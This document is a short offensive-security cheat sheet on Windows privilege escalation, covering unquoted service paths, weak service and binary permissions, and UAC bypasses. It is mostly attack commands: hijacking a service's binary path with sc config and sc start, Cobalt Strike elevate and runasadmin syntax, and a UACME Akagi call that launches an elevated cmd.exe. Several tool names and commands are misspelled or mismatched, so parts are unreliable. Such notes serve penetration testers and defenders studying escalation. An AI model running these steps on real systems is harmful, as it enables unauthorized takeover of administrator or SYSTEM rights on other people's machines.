# Privilege Escalation

* [Windows Services](#Windows-Services)
* [UAC Bypasses](#UAC-Bypasses)

## Windows Service
Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence and privlege escalation. 
### Unquoted Service Paths
An unquoted service path is where the path to the service binary is not wrapped in quotes. The vulnerabilty is how windows attempt to read thr path.

Condition:
* Has spaces in the path and also not quoted
* Permission to write in the file 

To list every services and the path to its executable WMI can be use:

```wmic service get name, pathname```

To check the permission:

```Powershell Get-Acl -Path “C:\Program Files\Vuln Services” | fl```
### Weak service Permission
The Vulnerability is to abuse weak permission by changing the binary path of service.
Use SharpUp to identify  service that are modifiable.

```
SharpUp.exe
```
Check what privileges has this service.

```
Powershell Get-ServiceAcl -Name nomService | select -expandproperty Access
```
```
sc  qc nom_service 
sc  config nom_service binpath="path\to\exploit" 
sc start nom_serrvice
```
### Weak Service Binary Permission
The Vulnerability is to abuse the privilege of the binary
```
Powershell Get-Acl -Path “pat/to/service” | fl
```
Upload the file and replace the service binary

## UAC Bypasses
An UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent. 
You need an administrator account.

Use tool like Seatbelt to check if it is possible

```
execute-assembly SharpUp.exe
```

Seabelt TokenPrivileges can list the current token’s privileges of a user.

```
execute-assembly Seabelt.exe TokenPrivileges

```
In cobalt Strick

```
elevate [exploit] [listener] 
runasadmin [exploit] [command + args] 
``` 
Use UACME Akagi: https://github.com/hfiref0x/UACME

```
akagi64 61 c:\windows\system32\cmd.exe

``` 
